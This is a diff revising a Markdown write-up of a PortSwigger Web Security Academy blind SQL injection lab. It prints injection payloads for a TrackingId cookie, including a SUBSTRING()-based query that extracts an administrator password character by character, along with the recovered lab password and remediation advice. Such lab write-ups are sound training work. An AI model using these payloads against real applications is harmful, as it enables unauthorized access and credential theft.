@@ -1,73 +1,76 @@
-# Blind SQL Injection – Conditional Responses
+# Blind SQL Injection with Conditional Responses
+
 * **Platform:** PortSwigger Web Security Academy
-* **Category:** SQL Injection
 * **Difficulty:** Practitioner
+* **Category:** SQL Injection — Blind SQL Injection
 * **Status:** Solved
 * **Tool:** Burp Suite
 
-## Lab Description
+## Objective
 
-The application contains a blind SQL injection vulnerability in the `TrackingId` cookie.
+Exploit a blind SQL injection vulnerability in the `TrackingId` cookie to retrieve the administrator's password and log in as the administrator.
 
-The application does not return SQL query results or display database errors. However, it displays a `Welcome back` message when the injected query returns rows.
+## Methodology
 
-**Objective:** Extract the administrator's password and log in as the administrator.
+1. Intercepted the application request using Burp Suite and identified the `TrackingId` cookie as the injection point.
+2. Confirmed the SQL injection vulnerability using a TRUE condition and observed the `Welcome back` message.
+3. Confirmed the existence of the `users` table using a conditional SQL query.
+4. Verified the administrator account and determined that its password contained multiple characters.
+5. Used the `SUBSTRING()` function to extract the administrator's password one character at a time by testing TRUE/FALSE conditions.
+6. Reconstructed the complete password and successfully logged in as the administrator.
 
-## Exploitation
+## Payloads
 
-### 1. Confirm SQL Injection
-
-Injected the following payload into the `TrackingId` cookie:
+**Confirm SQL injection:**
 
 ```sql
 ' AND 1=1--
 ```
 
-The `Welcome back` message appeared, confirming that the condition was TRUE.
-
-### 2. Confirm the Users Table
+**Confirm the users table exists:**
 
 ```sql
 ' AND (SELECT 'x' FROM users LIMIT 1)='x'--
 ```
 
-The application displayed the `Welcome back` message, confirming that the `users` table exists.
-
-### 3. Identify the Administrator Account
+**Identify the administrator account:**
 
 ```sql
 ' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)>1)='administrator'--
 ```
 
-The condition returned TRUE, confirming the administrator account and that its password contains more than one character.
-
-### 4. Extract the Administrator Password
-
-Used the `SUBSTRING()` function to retrieve the password one character at a time.
-
-Example:
+**Extract password characters:**
 
 ```sql
 ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--
 ```
 
-Repeated the process by changing the character position and testing possible characters.
+Repeated the final payload while changing the character position and testing different characters.
 
-### Extracted Password
+**Extracted Password:**
 
 ```text
 1vp254ggxtnmqq3ngrr0
 ```
 
-## Result
+## Vulnerability
 
-Successfully extracted the administrator's password using blind SQL injection with conditional responses and logged in as the administrator.
+The application incorporated the `TrackingId` cookie value into an SQL query without adequate protection, allowing SQL injection through user-controlled input.
 
-## Key Takeaways
+## Impact
 
-* Blind SQL injection can expose database information without displaying query results.
-* Conditional responses provide a TRUE/FALSE indicator.
-* `SUBSTRING()` allows character-by-character password extraction.
-* `LENGTH()` helps determine password length.
-* Parameterized queries help prevent SQL injection.
+An attacker could exploit conditional responses to extract sensitive database information, including administrator credentials, character by character.
+
+## Remediation
+
+* Use parameterized queries (prepared statements).
+* Avoid concatenating untrusted input into SQL statements.
+* Validate and handle cookie values securely.
+* Apply least-privilege database permissions.
+* Store passwords using strong, salted password hashes.
+
+## Evidence
+
+<img width="916" height="697" alt="Screenshot 2026-10-30 183303" src="https://github.com/user-attachments/assets/3fd1ce0d-1ec8-46c1-996e-2c34e68ed120" />
+<img width="1735" height="332" alt="image" src="https://github.com/user-attachments/assets/e47eda54-bf1d-448e-8a16-1d60234525cd" />
 
